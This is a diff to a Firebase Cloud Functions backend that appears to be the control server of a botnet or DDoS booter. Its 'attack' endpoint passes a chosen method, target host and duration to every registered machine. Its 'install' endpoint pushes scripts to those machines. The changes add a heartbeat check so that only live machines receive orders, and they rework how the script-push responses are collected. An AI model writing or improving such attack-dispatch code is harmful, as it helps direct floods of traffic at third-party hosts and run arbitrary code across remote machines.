@@ -1,13 +1,15 @@
 const functions = require("firebase-functions");
 const admin = require('firebase-admin');
 const axios = require('axios')
+const delay = require('delay')
 const app = admin.initializeApp();
 
 let globals = admin.firestore().collection('main').doc("globals")
 let setup = admin.firestore().collection('main').doc("setup")
+let config_ = admin.firestore().collection('main').doc("config")
 let scripts_ = admin.firestore().collection('scripts')
 let stats_ = admin.firestore().collection('main').doc("stats")
-
+let config = {}
 globals.get().then(async (doc) => {
     if (!doc.exists) {
         globals.set(
@@ -39,6 +41,21 @@ stats_.get().then(async (doc) => {
                 "userCount": 0
             }
         )
+    }
+})
+config_.get().then(async (doc) => {
+    if (!doc.exists) {
+        await config_.set(
+            {
+                "maxMachineAwolAge": 600000
+            }
+        ).then(function () {
+            config_.get().then(async (docx) => {
+                config = docx.data()
+            })
+        })
+    } else {
+        config = doc.data()
     }
 })
 setup.get().then(async (doc) => {
@@ -146,14 +163,16 @@ exports.attack = functions.https.onRequest(async (req, res) => {
     await admin.firestore().collection("machines").get().then(async (querySnapshot) => {
         await querySnapshot.forEach(async (doc) => {
             let cmachine = doc.data()
-            console.log(`http://${doc.id}:${cmachine.port.number}/attack/${rquer.method}/${rquer.host}/${rquer.time}/${rquer.id}`);
-            axios.get(`http://${doc.id}:${cmachine.port.number}/attack/${rquer.method}/${rquer.host}/${rquer.time}/${rquer.id}`)
-                .then(res => {
-                    console.log(res)
-                })
-                .catch(err => {
-                    console.error(err.response.data);
-                })
+            if ((Date.now() - cmachine.lastHeartbeat) < config.maxMachineAwolAge) {
+                console.log(`http://${doc.id}:${cmachine.port.number}/attack/${rquer.method}/${rquer.host}/${rquer.time}/${rquer.id}`);
+                axios.get(`http://${doc.id}:${cmachine.port.number}/attack/${rquer.method}/${rquer.host}/${rquer.time}/${rquer.id}`)
+                    .then(res => {
+                        console.log(res)
+                    })
+                    .catch(err => {
+                        console.error(err.response.data);
+                    })
+            }
         });
     });
     res.send(200)
@@ -162,27 +181,30 @@ exports.install = functions.https.onRequest(async (req, res) => {
     let rquer = req.query
     console.log(rquer);
     let machines = {
-        asked: [],
+        asked: 0,
         responded: [],
         busy: []
     }
-    await admin.firestore().collection("machines").get().then(async (querySnapshot) => {
+    await admin.firestore().collection("machines").get().then(async (querySnapshot) => { //find a way to un-delay this guy.
         await querySnapshot.forEach(async (doc) => {
             let cmachine = doc.data()
             console.log(`http://${doc.id}:${cmachine.port.number}/installScript/${rquer.scriptid}`);
+            machines.asked++
             await axios.get(`http://${doc.id}:${cmachine.port.number}/installScript/${rquer.scriptid}`)
-                .then(res => {
-                    machines.responded.push(currentMachine)
+                .then(async (res) => {
+                    machines.responded.push(cmachine)
                     return
                 })
-                .catch(err => {
-                    console.error(err.response.data);
-                    machines.busy.push(currentMachine)
+                .catch(async (err) => {
+                    console.error(err);
+                    machines.busy.push(cmachine)
                     return
                 })
         });
+    }).then(async function () {
+        await delay(5000)
         res.send(200, machines)
-    });
+    })
 });
 exports.globals = functions.https.onRequest((req, res) => {
     globals.get().then(async (doc) => {
